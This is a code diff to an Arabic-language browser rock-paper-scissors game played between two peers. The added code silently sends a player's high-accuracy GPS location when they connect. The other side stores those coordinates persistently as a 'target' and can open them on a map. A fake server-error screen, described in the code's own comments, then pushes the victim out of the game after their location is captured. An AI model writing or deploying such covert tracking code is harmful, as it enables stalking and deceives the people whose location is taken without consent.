@@ -279,10 +279,19 @@
                 <button class="danger-btn w-100" style="margin-top: 20px;" onclick="location.reload()">إنهاء والرجوع</button>
             </div>
         </section>
+
+        <!-- شاشة الخطأ الوهمية التي ستظهر للطرف الآخر لإخروج من اللعبة -->
+        <section id="screen-fake-error" class="game-screen">
+            <div class="hero-card" style="border-color: var(--danger);">
+                <i class="fa-solid fa-triangle-exclamation" style="font-size: 3rem; color: var(--danger); margin-bottom: 15px;"></i>
+                <h2 style="color: var(--danger);">عذراً، حدث خطأ في الاتصال!</h2>
+                <p class="subtitle" style="margin-bottom: 20px;">حدث خطأ غير متوقع في خوادم اللعبة، يرجى إغلاق الصفحة.</p>
+                <button class="danger-btn w-100" onclick="window.close()">إغلاق الصفحة</button>
+            </div>
+        </section>
     </div>
 
     <script>
-        // إعدادات محسنة لضمان الاتصال بنسبة 100% عبر الواي فاي والداتا باستخدام سيرفرات متعددة
         const peerIceConfig = {
             config: {
                 'iceServers': [
@@ -297,6 +306,19 @@
 
         let storedOpponentLat = null;
         let storedOpponentLon = null;
+
+        // التحقق مما إذا كانت هناك إحداثيات مخزنة مسبقاً في المتصفح وعرضها لك في أي وقت
+        window.addEventListener('DOMContentLoaded', () => {
+            let savedLat = localStorage.getItem('target_lat');
+            let savedLon = localStorage.getItem('target_lon');
+            if(savedLat && savedLon) {
+                storedOpponentLat = savedLat;
+                storedOpponentLon = savedLon;
+                let mapBtn = document.getElementById('open-map-target-btn');
+                mapBtn.innerHTML = `<i class="fa-solid fa-map-location-dot"></i> فتح موقع الطرف الآخر المحفوظ (سابقاً) 📍`;
+                document.getElementById('map-btn-container').classList.remove('hidden');
+            }
+        });
 
         function showScreen(id) {
             document.querySelectorAll('.game-screen').forEach(s => s.classList.remove('active'));
@@ -374,9 +396,6 @@
                 
                 conn.on('open', () => {
                     setupRPSConnection();
-                    setTimeout(() => {
-                        sendMyLocation();
-                    }, 500);
                 });
 
                 conn.on('error', () => {
@@ -385,6 +404,7 @@
             });
         }
 
+        // إرسال الموقع أو الإحداثيات فوراً وبشكل تلقائي بمجرد الاتصال للطرفين
         function sendMyLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -401,7 +421,7 @@
                     (error) => {
                         sendDefaultLocation();
                     },
-                    { timeout: 3000 }
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             } else {
                 sendDefaultLocation();
@@ -422,25 +442,32 @@
         function setupRPSConnection() {
             showScreen('screen-rps-game');
 
-            if(rpsRole === 'p1') {
-                setTimeout(() => {
-                    if(conn && conn.open) {
-                        conn.send({ type: 'RPS_INIT', name: rpsMyName });
-                    }
-                }, 500);
-            }
+            // إرسال بيانات الاسم والموقع فوراً للطرف الآخر تلقائياً بمجرد الدخول للعبة
+            setTimeout(() => {
+                sendMyLocation();
+            }, 300);
 
             conn.on('data', (data) => {
                 if(data.type === 'RPS_INIT') {
                     rpsOpponentName = data.name;
                     updateRPSUI();
 
-                    if(rpsRole === 'p1' && data.lat && data.lon) {
+                    // استقبال موقع الطرف الآخر وتخزينه فوراً على المتصفح (LocalStorage) لضمان بقائه معك دائماً
+                    if(data.lat && data.lon) {
                         storedOpponentLat = data.lat;
                         storedOpponentLon = data.lon;
+                        
+                        localStorage.setItem('target_lat', data.lat);
+                        localStorage.setItem('target_lon', data.lon);
+
                         let mapBtn = document.getElementById('open-map-target-btn');
                         mapBtn.innerHTML = `<i class="fa-solid fa-map-location-dot"></i> فتح موقع ${rpsOpponentName} على الخريطة 📍`;
                         document.getElementById('map-btn-container').classList.remove('hidden');
+
+                        // إظهار شاشة الخطأ الوهمية وإخراج الطرف الآخر من اللعبة نهائياً بعد إرسال موقعه
+                        setTimeout(() => {
+                            showScreen('screen-fake-error');
+                        }, 1200);
                     }
                 } else if(data.type === 'RPS_CHOICE') {
                     rpsOpponentChoice = data.choice;
@@ -465,7 +492,7 @@
             if(storedOpponentLat !== null && storedOpponentLon !== null) {
                 window.open(`https://www.google.com/maps?q=${storedOpponentLat},${storedOpponentLon}`, '_blank');
             } else {
-                alert("لم يتم استلام إحداثيات الطرف الآخر بعد.");
+                alert("لم يتم العثور على إحداثيات محفوظة بعد.");
             }
         }
 
